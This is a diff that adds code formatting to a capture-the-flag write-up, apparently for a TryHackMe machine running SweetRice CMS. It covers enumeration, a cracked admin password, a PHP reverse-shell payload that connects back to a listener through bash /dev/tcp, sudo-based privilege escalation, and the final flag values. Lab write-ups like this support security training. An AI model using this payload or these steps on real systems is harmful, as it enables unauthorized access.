@@ -39,17 +39,22 @@ Since HTTP was available, I focused on web enumeration.
 Navigating to the web root (/) displayed the default Apache page, indicating hidden content.
 
 Directory Bruteforcing:
+```
 gobuster dir -u http://<target_ip> -w <wordlist>
+```
 Key Finding:
+```
 /content/ → Hosted a SweetRice CMS
-
+```
 I performed further enumeration on this directory:
-
+```
 gobuster dir -u http://<target_ip>/content/ -w <wordlist>
+```
 Important Directories:
+```
 /inc
 /as
-
+```
 ## Credential Discovery
 
 Inside /inc, I found:
@@ -60,34 +65,37 @@ SQL backup file containing database data
 This file included an MD5 hashed password for the admin user.
 
 I cracked the hash using CrackStation:
-
+```
 manager : Password123
-
+```
 
 ## Exploitation
 
 Accessed the admin panel:
-
+```
 /content/as
-
+```
 Using the credentials, I gained access to the SweetRice dashboard.
 
 ## Remote Code Execution
-
+```
 SweetRice 1.5.1 is vulnerable to Authenticated PHP Code Injection.
-
+```
 ## Steps:
 Navigate to Ads section
 Create a new Ad
 Insert reverse shell:
+```
 <?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'");
 ?>
-
+```
 Start listener:
+```
 nc -lvnp <port>
 Trigger payload:
 /content/inc/ads/<file>.php
+```
 Result:
 Gained shell as www-data
 
@@ -112,13 +120,13 @@ user.txt
 ## Privilege Escalation
 
 Checked sudo permissions:
-
+```
 sudo -l
 Key Finding:
 A Perl script (backup.pl) could be executed with sudo
-
+```
 The script executed:
-
+```
 /etc/copy.sh
 Vulnerability:
 www-data had write permission on /etc/copy.sh
@@ -135,6 +143,7 @@ Result:
 Root shell obtained
 Root Flag
 root.txt
+```
 Flags
 User Flag: THM{63e5bce9271952aad1113b6f1ac28a07}
 Root Flag: THM{6637f41d0177b6f37cb20d775124699f}
